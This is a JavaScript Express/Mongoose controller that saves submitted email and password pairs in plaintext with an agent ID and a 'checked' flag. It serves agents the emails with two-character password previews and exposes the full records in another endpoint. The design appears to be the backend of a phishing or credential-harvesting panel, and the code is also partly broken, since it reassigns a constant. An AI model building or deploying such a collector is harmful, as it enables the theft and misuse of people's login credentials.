import ClientResponse from '../models/clientResponse.js';
import asyncHandler from "express-async-handler"

const getAllDatasForAgentsAnd = async (req,res) => {
    
  const datas= await ClientResponse.find({}, {
    
    email:1,
    password: { $substrCP: ["$password", 0, 2] } 
  }
  ).sort({
   createdAt:-1
  });
      if(datas)
      {
         res.status(201).json(datas)            
 
      }
      else {
         res.status(201).json({ message:false})            
 
      }
     
 
 }


const addClient =  async (req, res) => {
    const {email,  password, agentId} = req.body

      console.log(agentId)
    if(!agentId || agentId === ' '){
        agentId = ' '
  }
        const clientresponse = await ClientResponse.create({ email, password, agentId, checked:false });
        if(clientresponse)
        {
            
           res.status(201).json({ message:'saved'})     
        }
        else {
            res.status(201).json({message:'failed'})     

        }
 
        }
        // _id:clientresponse._id, email:clientresponse.email,
const getClientResponses = async (req,res) => {
   
    const Responses= await ClientResponse.find().sort({
      createdAt:-1
     });;

      res.status(201).json(Responses)            
    

}
const updateResponse= asyncHandler(async (req,res) => {

    const { checked, id} = req.body
    const data = await ClientResponse.findById(id);

     data.checked  = checked 
    
    const updated = await data.save();

    if(updated)
    {
      res.status(200).json({message:true 
      })
    }

  else {
      res.status(200).json({message:false
      }) 
  }

})
export { addClient, getClientResponses, updateResponse, getAllDatasForAgentsAnd}
            